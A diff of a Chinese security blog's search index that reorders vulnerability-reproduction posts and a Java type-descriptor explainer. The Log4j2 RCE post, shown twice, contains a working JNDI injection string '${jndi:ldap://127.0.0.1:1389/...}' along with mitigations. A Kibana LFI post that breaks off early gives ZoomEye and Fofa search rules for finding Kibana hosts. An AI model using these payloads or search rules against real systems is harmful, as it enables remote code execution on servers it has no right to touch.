@@ -1,71 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Apache Log4j2 RCE漏洞复现</title>
-    <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
-<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
-<p>pom.xml文件如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>点击下载相应程序包资源</p>
-<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
-<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
-<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
-<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果:</p>
-<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
-<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
-<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
-<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
-<p><strong>已知影响组件</strong></p>
-<ul>
-<li>Apache Struts2</li>
-<li>Apache Solr</li>
-<li>Apache Flink</li>
-<li>Apache Druid</li>
-<li>ElasticSearch</li>
-<li>flume</li>
-<li>dubbo</li>
-<li>Redis</li>
-<li>logstash</li>
-<li>kafka</li>
-</ul>
-<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
-<p>2、升级至 log4j-2.15.0-rc2： </p>
-<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
-<p>3、紧急缓解措施： </p>
-<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
-<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
-<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
-<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
-<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
-<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web容器漏洞</category>
-        <category>Apache</category>
-      </categories>
-      <tags>
-        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</title>
     <url>/2021/11/09/Apache%20Solr%20SSRF%20%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache Solr SSRF 漏洞(CVE-2021-27905)复现"></a>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</h1><hr>
@@ -249,6 +184,129 @@
       </tags>
   </entry>
   <entry>
+    <title>Apache Log4j2 RCE漏洞复现</title>
+    <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
+<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
+<p>pom.xml文件如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>点击下载相应程序包资源</p>
+<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
+<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
+<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
+<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果:</p>
+<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
+<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
+<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
+<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
+<p><strong>已知影响组件</strong></p>
+<ul>
+<li>Apache Struts2</li>
+<li>Apache Solr</li>
+<li>Apache Flink</li>
+<li>Apache Druid</li>
+<li>ElasticSearch</li>
+<li>flume</li>
+<li>dubbo</li>
+<li>Redis</li>
+<li>logstash</li>
+<li>kafka</li>
+</ul>
+<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
+<p>2、升级至 log4j-2.15.0-rc2： </p>
+<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
+<p>3、紧急缓解措施： </p>
+<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
+<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
+<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
+<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
+<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
+<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web容器漏洞</category>
+        <category>Apache</category>
+      </categories>
+      <tags>
+        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA类型描述符</title>
+    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
+    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
+<p>其中有这么一段记录,如下:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
+
+<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
+<p>于是我写了个简单的打印字符串数组Demo:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
+
+
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+<p>我们在来看下Class的getName()方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终实现交给了getnamenative()方法。</p>
+<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
+<p>对于非数组类型:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
+
+
+
+<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
+<p>对于数组类型；</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
+
+<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
+<p>我们来看看getName()方法的文档:</p>
+<ul>
+<li>对于原始数据类型，返回其 java 关键字</li>
+<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
+<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
+</ul>
+<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>java</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</title>
     <url>/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/</url>
     <content><![CDATA[<h1 id="Gitlab未授权命令执行漏洞复现-CVE-2021-22205"><a href="#Gitlab未授权命令执行漏洞复现-CVE-2021-22205" class="headerlink" title="Gitlab未授权命令执行漏洞复现(CVE-2021-22205)"></a>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</h1><hr>
@@ -384,64 +442,6 @@
       </categories>
       <tags>
         <tag>-web漏洞 - Gitlab -命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JAVA类型描述符</title>
-    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
-    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
-<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
-<p>其中有这么一段记录,如下:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
-
-<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
-<p>于是我写了个简单的打印字符串数组Demo:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果为:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
-
-
-
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
-<p>我们在来看下Class的getName()方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最终实现交给了getnamenative()方法。</p>
-<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
-<p>对于非数组类型:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
-
-
-
-<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
-<p>对于数组类型；</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
-
-<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
-<p>我们来看看getName()方法的文档:</p>
-<ul>
-<li>对于原始数据类型，返回其 java 关键字</li>
-<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
-<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
-</ul>
-<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-        <category>java</category>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
       </tags>
   </entry>
   <entry>
@@ -850,6 +850,107 @@
       </tags>
   </entry>
   <entry>
+    <title>Kibana本地文件包含漏洞(CVE-2018-17246)</title>
+    <url>/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/</url>
+    <content><![CDATA[<h1 id="Kibana本地文件包含漏洞（CVE-2018-17246）"><a href="#Kibana本地文件包含漏洞（CVE-2018-17246）" class="headerlink" title="Kibana本地文件包含漏洞（CVE-2018-17246）"></a>Kibana本地文件包含漏洞（CVE-2018-17246）</h1><hr>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElasticSearch Kibana &lt; 6.4.3</span><br><span class="line">ElasticSearch Kibana &lt; 5.6.13</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Fofa:</p>
